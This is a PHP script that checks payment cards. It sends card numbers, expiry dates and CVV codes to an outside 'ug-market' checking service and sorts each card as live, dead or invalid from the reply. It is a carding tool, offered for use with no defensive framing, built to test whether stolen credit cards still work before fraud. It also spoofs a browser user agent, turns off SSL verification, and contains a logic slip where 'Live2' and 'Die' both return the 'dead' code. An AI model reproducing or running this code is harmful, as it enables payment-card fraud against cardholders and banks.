<?php
set_time_limit(0);

function check($ccnum,$ccm,$ccy,$cvv){
	$user 	= "username";									// Your Username
	$pwd	= "password";									// Your Password
	$gate	= "checkcvv9";										// The tool you want to checking with

	$url	= "http://www.ug-market.com/ugm/xcheck.php";
	$data	= "user=".$user."&pwd=".$pwd."&gate=".$gate."&cc=".$ccnum."|".$ccm."|".$ccy."|".$cvv;
	$send	= _curl($url,$data);
	if($send == -200){
		return -200;
	}
	else{
		$result = Re($send,'Status=([^"]*)_');					// user preg_match to catch response
		if($result == "Invalid")
	    {
			return -1;
	    }
		elseif($result == "Live")
	    {
			return 1;
	    }
	    elseif($result == "Live2")		// Live2 (with checkcvv5 only) means: info of CC (CCNum, Exp, Cvv2) is valid, but cannot charge $ while check
	    {
			return 2;
	    }
	    elseif($result == "Die")
	    {
			return 2;
	    }
	    elseif($result == "Error")
	    {
			return 3;
	    }
	    else
	    {
			return 4;
	    }
	    //-1 = Invalid
	    //1 = LIVE
	    //2 = DEAD
	    //3 = API ERROR
	    //4 = UNKNOWN
	}
}

function _curl($url,$post="") {  
	$ch = curl_init();
	if($post) {
		curl_setopt($ch, CURLOPT_POST ,1);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
	}
	curl_setopt($ch, CURLOPT_URL, $url); 
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/6.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3"); 
	if(stristr($url,"https")){
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
	}
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); 
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 6); 
	$result=curl_exec ($ch); 
	$info = curl_getinfo($ch);
	curl_close ($ch); 
	if($info['http_code'] != "200") return -200;
	else return $result; 
}

function inStr($s,$as){
	$s=strtoupper($s);
	if(!is_array($as)) $as=array($as);
	for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
	return false;
}

function R($s,$e){
	preg_match("/".$e."/",$s,$m);
	return $m[1];
}
function Re($s,$e){
	return html_entity_decode(R($s,$e));
}
?>